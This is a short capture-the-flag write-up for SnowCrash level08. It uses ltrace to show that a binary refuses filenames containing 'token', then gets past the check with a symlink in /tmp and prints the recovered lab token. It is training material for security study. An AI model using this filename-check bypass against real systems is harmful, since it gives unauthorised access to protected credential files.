In this level we have a level08 binary and a token file.
if we try to cat token, we do not have the permissions.
If we run level08 with token, we see with ltrace that the binary fails if runned with "token" as argument:

```
strstr("token", "token")                                                            = "token"
printf("You may not access '%s'\n", "token"You may not access 'token')
```

So we need the content of token without run level08 with its name as argument. we could try a symlink :

``` bash
    ln -s /home/user/level08/token /tmp/remote
    level08@SnowCrash:~$ ls -l /tmp/remote
    lrwxrwxrwx 1 level08 level08 24 Sep 29 15:52 /tmp/remote -> /home/user/level08/token
    level08@SnowCrash:~$ ./level08 /tmp/remote
    quif5eloekouj29ke0vouxean

```